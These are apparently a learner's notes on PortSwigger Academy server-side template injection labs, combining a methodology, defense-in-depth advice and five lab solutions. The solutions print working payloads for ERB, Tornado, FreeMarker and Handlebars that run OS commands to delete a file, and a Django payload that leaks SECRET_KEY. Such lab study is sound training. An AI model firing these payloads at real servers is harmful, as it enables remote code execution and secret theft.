# Server-Side Template Injection (SSTI)

> PortSwigger Web Security Academy · **5/7** labs completed

SSTI happens when user input is inserted into a template as code instead of data. It can lead to information disclosure and, often, remote code execution.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [Concept notes](#concept-notes)
- [1. Basic server-side template injection](#1-basic-server-side-template-injection)
- [2. Basic server-side template injection (code context)](#2-basic-server-side-template-injection-code-context)
- [3. Server-side template injection using documentation](#3-server-side-template-injection-using-documentation)
- [4. Server-side template injection in an unknown language with a documented exploit](#4-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
- [5. Server-side template injection with information disclosure via user-supplied objects](#5-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Identify an input that ends up rendered inside a server-side template (profile fields, email templates, PDF generators, search terms shown back to the user).
- Fuzz with generic template syntax to trigger an error that reveals the engine: `${{<%[%'"}}%\`.
- Narrow down the specific engine from the error message or from which syntax evaluates (`{{7*7}}` for Jinja2/Twig, `${7*7}` for FreeMarker/Velocity, `<%= 7*7 %>` for ERB).
- Once the engine is known, look up its documentation for dangerous built-ins/globals that expose the OS, config, or arbitrary code execution (e.g. Jinja2 `{{settings}}`, `{% debug %}`, `__class__.__mro__`).
- Check if the sandbox (if any) blocks specific attributes/methods, and whether an alternate path to the same functionality exists (different object, different method chain).
- Escalate from information disclosure (reading config, secret keys) toward code execution if the engine allows it, confirming impact safely and only as far as needed.

## Concept notes

### testing methodology
- Identify the user controlled input
- Identify where the input appears
- Then look how the input is processed
- Find the template lang like ERB template.
- Identify the template engine like ERB, freemarker,jinja2 etc
- If you don't know the template lang, then do fuzzing to get the error and the template being used and search on the internet to find their basic syntax
- After finding the syntax, inject a basic command to look how it behaves
- Then write the actual payload to do the objective

### SSTI documentation research workflow

1. Identify the engine
    Example: Jinja2, Twig, FreeMarker, ERB or Mako
2. Find official documentation
    Prefer the documentation for the version used by the application.
3. Study the expression language
    Learn variable access, expressions, functions, filters, loops and conditions.
4. Study the template environment
    Identify default objects, global variables and developer-supplied functionality.
5. Study security controls
    Check sandbox policies, callable restrictions and attribute access rules.
6. Compare with target behavior
    Validate what is actually accessible in the application.
7. Research known issues
    Check advisories, version history and published security research.
8. Develop a controlled proof of concept
    Demonstrate only the access or impact needed to establish the finding.

### Layered template security

User-controlled input
Treat as data, not template source

Fixed developer-controlled template
Separate instructions from user data

Restricted rendering environment
Minimal variables, objects and functions

Process and resource isolation
Least privilege, time and memory limits

Rendered output
Context-appropriate output handling

### Custom SSTI investigation workflow

1. Confirm template evaluation

    Use a harmless expression such as `{{ 7*7 }}` and verify that the server evaluates it.

2. Identify the engine and runtime

    Correlate expression syntax, error messages, framework behavior and application evidence.

3. Identify the template context

    Determine which variables and objects are available to the template.

4. Explore object relationships

    Investigate attributes and return values to understand the reachable object graph.

5. Investigate callable methods

    Determine which methods can be invoked and what they return.

6. Understand restrictions

    Identify blocked attributes, blocked callables, sandbox policies and application-level controls.

7. Identify a security-relevant capability

    Determine whether the accessible functionality exposes sensitive data or performs privileged operations.

8. Validate the impact

    Use the least intrusive proof that demonstrates the actual impact. Do not assume RCE without evidence.

### preventions
SSTI defense in depth

1. Fixed templates

Prevent user input from becoming template source.

2. Minimal template context

Expose only the variables and functions genuinely required.

3. Sandbox restrictions

Restrict dangerous attributes, callables and operations when user-defined templates are necessary.

4. Process isolation

Run untrusted template rendering in an isolated environment.

5. Resource limits

Restrict CPU, memory, execution time and output size.

6. Operating system least privilege

Ensure the rendering process cannot access unnecessary files, credentials or network resources.

#### Recommended practices

1. Use fixed, developer-controlled template files wherever possible.
2. Pass user input through template variables rather than concatenating it into template source.
3. Avoid compiling arbitrary user-controlled template strings.
4. Restrict user-defined templates to a deliberately limited language and feature set.
5. Expose only the minimum required objects to templates.
6. Avoid passing powerful service objects, database connections or configuration objects unnecessarily.
7. Apply sandboxing when user-defined templates are a genuine requirement.
8. Keep template engines and dependencies updated.
9. Run untrusted template processing in an isolated process or container.
10. Apply CPU, memory, execution-time and output-size limits.
11. Run the rendering process with minimal filesystem and network permissions.
12. Include SSTI checks in secure code reviews and security testing.

## Lab write-ups

### 1. Basic server-side template injection

**Lab:** [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

- In this lab there is a SSTI vulnerability
- When I opened the site and clicked 1st product it shows it is out of stock and the url got changed too with the query parameter `message` and the value is out of stock
- Now I have to find the syntax of the template and they have already given that it uses ERB template so I googled it to find the syntax and found that `<%= xyz %>`
- Now we will test with something like `<%= 2*2 %>` and put it in the url as query parameter value and I got the message as 4 instead of out of stock. I put the url encoded value in the url which is `<%25%3d+2*2+%25>`
- Now we confirmed that it is evaluating our expression rather than taking it as literal data
- Now we have to delete the .txt from carlos account and it usually lives in /home/carlos/morale.txt
- And from the ERB documentation we found out that we can use File.delete() to do, so now we will build the payload to delete the file and put it as the query parameter value
- The payload is `<%25%3d+system('rm+/home/carlos/morale.txt')+%25>`
- The full url is `https://YOUR-LAB-ID.web-security-academy.net/?message=%3C%25%3d+File.delete(%27/home/carlos/morale.txt%27)+%25%3E`

---

### 2. Basic server-side template injection (code context)

**Lab:** [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

- In this lab it is using tornado template
- We need to find the basic syntax of it and we found out that it is `{{xyz}}`
- Now this page has the comment feature in posts and in myaccount there is a place called preferred name and when we change it, the name shown who commented changes
- So now get the request which is used to change the name and here it is a POST request
- Now we apply our expression, we need to keep the pre existing value, close that value and then we will add our expression, so the payload will be ``blog-post-author-display=user.first_name}}{{2*2}}``
- Now when we reload the comment page the name changes from peter to peter4}} confirming the SSTI
- Now we will add our payload to delete the file and here os.remove is used to delete the file and before using os.remove, we need to import os
- The final payload is `blog-post-author-display=user.first_name}}{%+import+os+%}{{os.remove('/home/carlos/morale.txt')}}`

---

### 3. Server-side template injection using documentation

**Lab:** [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

- Log in using the credentials `content-manager:C0nt3ntM4n4g3r`.
- Navigate to the product template editor.
- Observe the existing FreeMarker expressions: `${product.stock}`, `${product.name}`, and `${product.price}`.
- Replace an existing expression with `${abc}` and save. The resulting error confirms that the application evaluates template expressions
- Test `${7*7}`. The output `49` confirms arithmetic evaluation
- Identify the template engine version using `${.version}`. The output `2.3.29` identifies FreeMarker 2.3.29.
- Identify available data model variables using `${.data_model?keys?join(",")}`. The output `product` reveals the available product object.
- Investigate the official FreeMarker documentation to understand the `?new` built-in and its requirement that instantiated classes implement `TemplateModel`.
- Explore the documentation's known implementing classes and identify `freemarker.template.utility.Execute`, which implements `TemplateMethodModel`
- Initially try `${"java.io.File"?new("/home/carlos/morale.txt").delete()}`. This fails because `java.io.File` does not implement `TemplateModel`.
- Use `freemarker.template.utility.Execute` instead because it implements a compatible FreeMarker interface and supports operating system command execution.
- Use the following decoded payload:
- `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}`
- Use the following URL-encoded payload:
- ```%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bex%28%22rm+%2Fhome%2Fcarlos%2Fmorale.txt%22%29%7D````
- Replace the original empty `${}` placeholder entirely with the URL-encoded payload. Do not wrap the complete payload inside another `${...}`.
- The `<#assign ...>` directive creates a variable named `ex` containing an instance of the `Execute` class.
- The `${ex(...)}` expression invokes the command execution functionality and runs `rm /home/carlos/morale.txt` on the server.
- Save the modified template and verify that the lab is solved.
- SSTI can escalate to Remote Code Execution (RCE) when an attacker can access template engine functionality capable of executing operating system commands.

---

### 4. Server-side template injection in an unknown language with a documented exploit

**Lab:** [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

- In this lab we don't know what template it is using so first I used the lab 1 payload to find it and it is just displaying as it is
- Then when I use second lab payload I got the error and I found out that it is using handlebars
- Now search for handlebars SSTI exploit and go to the github link. there you will get the payload for printing the files`ls -la`
- Now change it to delete the file

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

```
https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

---

### 5. Server-side template injection with information disclosure via user-supplied objects

**Lab:** [Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

- This is again a unknown lang one
- So we will try some of the previous lab's payload and test it and the error tells that it is django
- When I read the django, there is a function called debug which lists the debugging details
- When I run `{% debug %}` it tells all the debugging details
- The below message is result we got when I run debug

```
{'product': {'name': 'Cheshire Cat Grin', 'price': '$5.49', 'stock': 535}, 'settings': }{'False': False, 'None': None, 'True': True} {'Cookie': , 'HTMLParser': , 'SocketServer': , 'StringIO': , 'UserDict': , 'UserList': , '__builtin__': , '__future__': , '__main__': , '_abcoll': , '_ast': , '_bisect': , '_codecs': , '_collections': , '_ctypes': , '_functools': , '_hashlib': , '_heapq': , '_io': , '_json': , '_locale': , '_random': , '_socket': , '_sre': , '_ssl': , '_struct': , '_sysconfigdata': , '_sysconfigdata_nd': , '_warnings': , '_weakref': , '_weakrefset': , 'abc': , 'argparse': , 'array': , 'ast': , 'atexit': , 'base64': , 'binascii': , 'bisect': , 'bz2': , 'cPickle': , 'cStringIO': , 'calendar': , 'cgi': , 'codecs': , 'collections': , 'contextlib': , 'copy': , 'copy_reg': , 'ctypes': , 'ctypes._ctypes': None, 'ctypes._endian': , 'ctypes.ctypes': None, 'ctypes.errno': None, 'ctypes.os': None, 'ctypes.re': None, 'ctypes.struct': None, 'ctypes.subprocess': None, 'ctypes.sys': None, 'ctypes.tempfile': None, 'ctypes.util': , 'datetime': , 'decimal': , 'dis': , 'django': , 'django.__future__': None, 'django.apps': , 'django.apps.collections': None, 'django.apps.config': , 'django.apps.django': None, 'django.apps.functools': None, 'django.apps.importlib': None, 'django.apps.os': None, 'django.apps.registry': , 'django.apps.sys': None, 'django.apps.threading': None, 'django.apps.warnings': None, 'django.conf': , 'django.conf.__future__': None, 'django.conf.django': None, 'django.conf.global_settings': , 'django.conf.importlib': None, 'django.conf.os': None, 'django.conf.time': None, 'django.core': , 'django.core.__future__': None, 'django.core.base64': None, 'django.core.cache': , 'django.core.cache.__future__': None, 'django.core.cache.backends': , 'django.core.cache.backends.__future__': None, 'django.core.cache.backends.base': , 'django.core.cache.backends.django': None, 'django.core.cache.backends.time': None, 'django.core.cache.backends.warnings': None, 'django.core.cache.django': None, 'django.core.cache.hashlib': None, 'django.core.cache.threading': None, 'django.core.cache.utils': , 'django.core.checks': , 'django.core.checks.__future__': None, 'django.core.checks.caches': , 'django.core.checks.collections': None, 'django.core.checks.compatibility': , 'django.core.checks.compatibility.__future__': None, 'django.core.checks.compatibility.django': None, 'django.core.checks.compatibility.django_1_10': , 'django.core.checks.compatibility.django_1_8_0': , 'django.core.checks.copy': None, 'django.core.checks.database': , 'django.core.checks.django': None, 'django.core.checks.inspect': None, 'django.core.checks.itertools': None, 'django.core.checks.messages': , 'django.core.checks.model_checks': , 'django.core.checks.registry': , 'django.core.checks.security': , 'django.core.checks.security.base': , 'django.core.checks.security.csrf': , 'django.core.checks.security.django': None, 'django.core.checks.security.sessions': , 'django.core.checks.templates': , 'django.core.checks.types': None, 'django.core.checks.urls': , 'django.core.checks.utils': , 'django.core.collections': None, 'django.core.datetime': None, 'django.core.django': None, 'django.core.exceptions': , 'django.core.files': , 'django.core.files.__future__': None, 'django.core.files.base': , 'django.core.files.datetime': None, 'django.core.files.django': None, 'django.core.files.errno': None, 'django.core.files.fcntl': None, 'django.core.files.images': , 'django.core.files.io': None, 'django.core.files.locks': , 'django.core.files.move': , 'django.core.files.os': None, 'django.core.files.shutil': None, 'django.core.files.storage': , 'django.core.files.struct': None, 'django.core.files.temp': , 'django.core.files.tempfile': None, 'django.core.files.uploadedfile': , 'django.core.files.uploadhandler': , 'django.core.files.utils': , 'django.core.files.warnings': None, 'django.core.files.zlib': None, 'django.core.json': None, 'django.core.mail': , 'django.core.mail.__future__': None, 'django.core.mail.django': None, 'django.core.mail.email': None, 'django.core.mail.io': None, 'django.core.mail.message': , 'django.core.mail.mimetypes': None, 'django.core.mail.os': None, 'django.core.mail.random': None, 'django.core.mail.socket': None, 'django.core.mail.time': None, 'django.core.mail.utils': , 'django.core.management': , 'django.core.management.__future__': None, 'django.core.management.argparse': None, 'django.core.management.base': , 'django.core.management.collections': None, 'django.core.management.color': , 'django.core.management.django': None, 'django.core.management.importlib': None, 'django.core.management.os': None, 'django.core.management.pkgutil': None, 'django.core.management.sys': None, 'django.core.math': None, 'django.core.os': None, 'django.core.paginator': , 'django.core.re': None, 'django.core.serializers': , 'django.core.serializers.__future__': None, 'django.core.serializers.base': , 'django.core.serializers.collections': None, 'django.core.serializers.django': None, 'django.core.serializers.importlib': None, 'django.core.serializers.json': , 'django.core.serializers.python': , 'django.core.signals': , 'django.core.signing': , 'django.core.time': None, 'django.core.validators': , 'django.core.warnings': None, 'django.core.zlib': None, 'django.db': , 'django.db.backends': , 'django.db.backends.__future__': None, 'django.db.backends.datetime': None, 'django.db.backends.decimal': None, 'django.db.backends.django': None, 'django.db.backends.hashlib': None, 'django.db.backends.logging': None, 'django.db.backends.time': None, 'django.db.backends.utils': , 'django.db.django': None, 'django.db.importlib': None, 'django.db.migrations': , 'django.db.migrations.__future__': None, 'django.db.migrations.collections': None, 'django.db.migrations.contextlib': None, 'django.db.migrations.copy': None, 'django.db.migrations.django': None, 'django.db.migrations.exceptions': , 'django.db.migrations.migration': , 'django.db.migrations.operations': , 'django.db.migrations.operations.__future__': None, 'django.db.migrations.operations.base': , 'django.db.migrations.operations.django': None, 'django.db.migrations.operations.fields': , 'django.db.migrations.operations.models': , 'django.db.migrations.operations.special': , 'django.db.migrations.operations.utils': , 'django.db.migrations.state': , 'django.db.migrations.warnings': None, 'django.db.models': , 'django.db.models.__future__': None, 'django.db.models.aggregates': , 'django.db.models.base': , 'django.db.models.bisect': None, 'django.db.models.collections': None, 'django.db.models.constants': , 'django.db.models.copy': None, 'django.db.models.datetime': None, 'django.db.models.decimal': None, 'django.db.models.deletion': , 'django.db.models.django': None, 'django.db.models.expressions': , 'django.db.models.fields': , 'django.db.models.fields.__future__': None, 'django.db.models.fields.base64': None, 'django.db.models.fields.collections': None, 'django.db.models.fields.copy': None, 'django.db.models.fields.datetime': None, 'django.db.models.fields.decimal': None, 'django.db.models.fields.django': None, 'django.db.models.fields.files': , 'django.db.models.fields.functools': None, 'django.db.models.fields.inspect': None, 'django.db.models.fields.itertools': None, 'django.db.models.fields.operator': None, 'django.db.models.fields.os': None, 'django.db.models.fields.posixpath': None, 'django.db.models.fields.proxy': , 'django.db.models.fields.related': , 'django.db.models.fields.related_descriptors': , 'django.db.models.fields.related_lookups': , 'django.db.models.fields.reverse_related': , 'django.db.models.fields.uuid': None, 'django.db.models.fields.warnings': None, 'django.db.models.functions': , 'django.db.models.functions.base': , 'django.db.models.functions.datetime': , 'django.db.models.functions.django': None, 'django.db.models.functools': None, 'django.db.models.hashlib': None, 'django.db.models.importlib': None, 'django.db.models.indexes': , 'django.db.models.inspect': None, 'django.db.models.itertools': None, 'django.db.models.lookups': , 'django.db.models.manager': , 'django.db.models.math': None, 'django.db.models.operator': None, 'django.db.models.options': , 'django.db.models.query': , 'django.db.models.query_utils': , 'django.db.models.signals': , 'django.db.models.sql': , 'django.db.models.sql.collections': None, 'django.db.models.sql.constants': , 'django.db.models.sql.copy': None, 'django.db.models.sql.datastructures': , 'django.db.models.sql.django': None, 'django.db.models.sql.itertools': None, 'django.db.models.sql.query': , 'django.db.models.sql.re': None, 'django.db.models.sql.string': None, 'django.db.models.sql.subqueries': , 'django.db.models.sql.warnings': None, 'django.db.models.sql.where': , 'django.db.models.sys': None, 'django.db.models.utils': , 'django.db.models.warnings': None, 'django.db.os': None, 'django.db.pkgutil': None, 'django.db.threading': None, 'django.db.transaction': , 'django.db.utils': , 'django.dispatch': , 'django.dispatch.dispatcher': , 'django.dispatch.django': None, 'django.dispatch.sys': None, 'django.dispatch.threading': None, 'django.dispatch.warnings': None, 'django.dispatch.weakref': None, 'django.dispatch.weakref_backports': , 'django.django': None, 'django.forms': , 'django.forms.UserList': None, 'django.forms.__future__': None, 'django.forms.boundfield': , 'django.forms.collections': None, 'django.forms.copy': None, 'django.forms.datetime': None, 'django.forms.decimal': None, 'django.forms.django': None, 'django.forms.fields': , 'django.forms.forms': , 'django.forms.formsets': , 'django.forms.io': None, 'django.forms.itertools': None, 'django.forms.json': None, 'django.forms.models': , 'django.forms.os': None, 'django.forms.re': None, 'django.forms.renderers': , 'django.forms.sys': None, 'django.forms.utils': , 'django.forms.uuid': None, 'django.forms.warnings': None, 'django.forms.widgets': , 'django.http': , 'django.http.__future__': None, 'django.http.base64': None, 'django.http.binascii': None, 'django.http.cgi': None, 'django.http.cookie': , 'django.http.copy': None, 'django.http.datetime': None, 'django.http.django': None, 'django.http.email': None, 'django.http.io': None, 'django.http.itertools': None, 'django.http.json': None, 'django.http.multipartparser': , 'django.http.re': None, 'django.http.request': , 'django.http.response': , 'django.http.sys': None, 'django.http.time': None, 'django.template': , 'django.template.__future__': None, 'django.template.backends': , 'django.template.backends.base': , 'django.template.backends.django': , 'django.template.backends.jinja2': , 'django.template.base': , 'django.template.collections': None, 'django.template.context': , 'django.template.contextlib': None, 'django.template.copy': None, 'django.template.datetime': None, 'django.template.decimal': None, 'django.template.defaultfilters': , 'django.template.defaulttags': , 'django.template.django': None, 'django.template.engine': , 'django.template.exceptions': , 'django.template.functools': None, 'django.template.importlib': None, 'django.template.inspect': None, 'django.template.itertools': None, 'django.template.library': , 'django.template.loader': , 'django.template.loader_tags': , 'django.template.logging': None, 'django.template.operator': None, 'django.template.os': None, 'django.template.posixpath': None, 'django.template.pprint': None, 'django.template.random': None, 'django.template.re': None, 'django.template.response': , 'django.template.smartif': , 'django.template.sys': None, 'django.template.utils': , 'django.template.warnings': None, 'django.templatetags': , 'django.templatetags.__future__': None, 'django.templatetags.cache': , 'django.templatetags.datetime': None, 'django.templatetags.django': None, 'django.templatetags.i18n': , 'django.templatetags.l10n': , 'django.templatetags.pytz': None, 'django.templatetags.static': , 'django.templatetags.sys': None, 'django.templatetags.tz': , 'django.urls': , 'django.urls.__future__': None, 'django.urls.base': , 'django.urls.django': None, 'django.urls.exceptions': , 'django.urls.functools': None, 'django.urls.importlib': None, 'django.urls.re': None, 'django.urls.resolvers': , 'django.urls.threading': None, 'django.urls.utils': , 'django.utils': , 'django.utils.__future__': None, 'django.utils._os': , 'django.utils.autoreload': , 'django.utils.base64': None, 'django.utils.baseconv': , 'django.utils.binascii': None, 'django.utils.calendar': None, 'django.utils.codecs': None, 'django.utils.collections': None, 'django.utils.contextlib': None, 'django.utils.copy': None, 'django.utils.crypto': , 'django.utils.datastructures': , 'django.utils.dateformat': , 'django.utils.dateparse': , 'django.utils.dates': , 'django.utils.datetime': None, 'django.utils.datetime_safe': , 'django.utils.decimal': None, 'django.utils.deconstruct': , 'django.utils.decorators': , 'django.utils.deprecation': , 'django.utils.django': None, 'django.utils.duration': , 'django.utils.email': None, 'django.utils.encoding': , 'django.utils.formats': , 'django.utils.functional': , 'django.utils.functools': None, 'django.utils.gzip': None, 'django.utils.hashlib': None, 'django.utils.hmac': None, 'django.utils.html': , 'django.utils.html_parser': , 'django.utils.http': , 'django.utils.imp': None, 'django.utils.importlib': None, 'django.utils.inspect': , 'django.utils.io': None, 'django.utils.ipv6': , 'django.utils.itercompat': , 'django.utils.locale': None, 'django.utils.log': , 'django.utils.logging': None, 'django.utils.lorem_ipsum': , 'django.utils.lru_cache': , 'django.utils.module_loading': , 'django.utils.numberformat': , 'django.utils.operator': None, 'django.utils.os': None, 'django.utils.pytz': None, 'django.utils.random': None, 'django.utils.re': None, 'django.utils.regex_helper': , 'django.utils.safestring': , 'django.utils.signal': None, 'django.utils.six': , 'django.utils.six.moves': , 'django.utils.six.moves.http_client': , 'django.utils.six.moves.urllib': , 'django.utils.six.moves.urllib.parse': , 'django.utils.struct': None, 'django.utils.subprocess': None, 'django.utils.sys': None, 'django.utils.tempfile': None, 'django.utils.termcolors': , 'django.utils.termios': None, 'django.utils.text': , 'django.utils.threading': None, 'django.utils.time': None, 'django.utils.timesince': , 'django.utils.timezone': , 'django.utils.traceback': None, 'django.utils.translation': , 'django.utils.translation.__future__': None, 'django.utils.translation.django': None, 'django.utils.translation.re': None, 'django.utils.translation.warnings': None, 'django.utils.tree': , 'django.utils.unicodedata': None, 'django.utils.urlparse': None, 'django.utils.version': , 'django.utils.warnings': None, 'django.views': , 'django.views.__future__': None, 'django.views.debug': , 'django.views.django': None, 'django.views.generic': , 'django.views.generic.__future__': None, 'django.views.generic.base': , 'django.views.generic.dates': , 'django.views.generic.datetime': None, 'django.views.generic.detail': , 'django.views.generic.django': None, 'django.views.generic.edit': , 'django.views.generic.functools': None, 'django.views.generic.list': , 'django.views.generic.logging': None, 'django.views.re': None, 'django.views.sys': None, 'django.views.types': None, 'email': , 'email.Charset': , 'email.Encoders': , 'email.Errors': , 'email.FeedParser': , 'email.Generator': , 'email.Header': , 'email.Iterators': , 'email.MIMEAudio': , 'email.MIMEBase': , 'email.MIMEImage': , 'email.MIMEMessage': , 'email.MIMEMultipart': , 'email.MIMENonMultipart': , 'email.MIMEText': , 'email.Message': , 'email.Parser': , 'email.Utils': , 'email._parseaddr': , 'email.base64': None, 'email.base64MIME': , 'email.base64mime': , 'email.binascii': None, 'email.cStringIO': None, 'email.calendar': None, 'email.charset': , 'email.codecs': None, 'email.email': None, 'email.encoders': , 'email.errors': , 'email.generator': , 'email.header': , 'email.iterators': , 'email.message': , 'email.mime': , 'email.mime.base': , 'email.mime.email': None, 'email.mime.message': , 'email.mime.multipart': , 'email.mime.nonmultipart': , 'email.mime.text': , 'email.os': None, 'email.quopri': None, 'email.quopriMIME': , 'email.quoprimime': , 'email.random': None, 'email.re': None, 'email.socket': None, 'email.string': None, 'email.sys': None, 'email.time': None, 'email.urllib': None, 'email.utils': , 'email.uu': None, 'email.warnings': None, 'encodings': , 'encodings.__builtin__': None, 'encodings.aliases': , 'encodings.ascii': , 'encodings.codecs': None, 'encodings.encodings': None, 'encodings.utf_8': , 'errno': , 'exceptions': , 'fcntl': , 'fnmatch': , 'functools': , 'gc': , 'genericpath': , 'gettext': , 'grp': , 'gzip': , 'hashlib': , 'heapq': , 'hmac': , 'htmlentitydefs': , 'httplib': , 'imp': , 'importlib': , 'importlib.sys': None, 'inspect': , 'io': , 'itertools': , 'jinja2': , 'jinja2._compat': , 'jinja2.ast': None, 'jinja2.bccache': , 'jinja2.cPickle': None, 'jinja2.cStringIO': None, 'jinja2.collections': None, 'jinja2.compiler': , 'jinja2.decimal': None, 'jinja2.defaults': , 'jinja2.environment': , 'jinja2.errno': None, 'jinja2.exceptions': , 'jinja2.filters': , 'jinja2.fnmatch': None, 'jinja2.functools': None, 'jinja2.hashlib': None, 'jinja2.idtracking': , 'jinja2.itertools': None, 'jinja2.json': None, 'jinja2.keyword': None, 'jinja2.lexer': , 'jinja2.loaders': , 'jinja2.markupsafe': None, 'jinja2.marshal': None, 'jinja2.math': None, 'jinja2.nodes': , 'jinja2.operator': None, 'jinja2.optimizer': , 'jinja2.os': None, 'jinja2.parser': , 'jinja2.random': None, 'jinja2.re': None, 'jinja2.runtime': , 'jinja2.stat': None, 'jinja2.string': None, 'jinja2.sys': None, 'jinja2.tempfile': None, 'jinja2.tests': , 'jinja2.threading': None, 'jinja2.types': None, 'jinja2.urllib': None, 'jinja2.utils': , 'jinja2.visitor': , 'jinja2.warnings': None, 'jinja2.weakref': None, 'json': , 'json._json': None, 'json.decoder': , 'json.encoder': , 'json.json': None, 'json.re': None, 'json.scanner': , 'json.struct': None, 'json.sys': None, 'keyword': , 'linecache': , 'locale': , 'logging': , 'logging.SocketServer': None, 'logging.atexit': None, 'logging.cPickle': None, 'logging.cStringIO': None, 'logging.codecs': None, 'logging.collections': None, 'logging.config': , 'logging.errno': None, 'logging.handlers': , 'logging.io': None, 'logging.logging': None, 'logging.os': None, 'logging.re': None, 'logging.socket': None, 'logging.stat': None, 'logging.struct': None, 'logging.sys': None, 'logging.thread': None, 'logging.threading': None, 'logging.time': None, 'logging.traceback': None, 'logging.types': None, 'logging.warnings': None, 'logging.weakref': None, 'markupbase': , 'markupsafe': , 'markupsafe._compat': , 'markupsafe._speedups': , 'markupsafe.collections': None, 'markupsafe.re': None, 'markupsafe.string': None, 'markupsafe.sys': None, 'marshal': , 'math': , 'mimetools': , 'mimetypes': , 'numbers': , 'opcode': , 'operator': , 'os': , 'os.path': , 'pickle': , 'pkgutil': , 'posix': , 'posixpath': , 'pprint': , 'pwd': , 'pytz': , 'pytz.UserDict': None, 'pytz.bisect': None, 'pytz.collections': None, 'pytz.datetime': None, 'pytz.exceptions': , 'pytz.lazy': , 'pytz.os': None, 'pytz.pytz': None, 'pytz.struct': None, 'pytz.sys': None, 'pytz.threading': None, 'pytz.tzfile': , 'pytz.tzinfo': , 'quopri': , 'random': , 're': , 'rfc822': , 'select': , 'shutil': , 'signal': , 'site': , 'sitecustomize': , 'socket': , 'sre_compile': , 'sre_constants': , 'sre_parse': , 'ssl': , 'stat': , 'string': , 'strop': , 'struct': , 'subprocess': , 'sys': , 'sysconfig': , 'tempfile': , 'termios': , 'textwrap': , 'thread': , 'threading': , 'time': , 'token': , 'tokenize': , 'traceback': , 'types': , 'unicodedata': , 'urllib': , 'urlparse': , 'uu': , 'uuid': , 'warnings': , 'weakref': , 'zipimport': , 'zlib': }
```

- Now the result shows that there is a settings options which may contain sensitive info like sessionkey, secretkey,etc
- So I tried settings.SECRET_KEY so the payload will be `{{settings.SECRET_KEY}}` and encode it
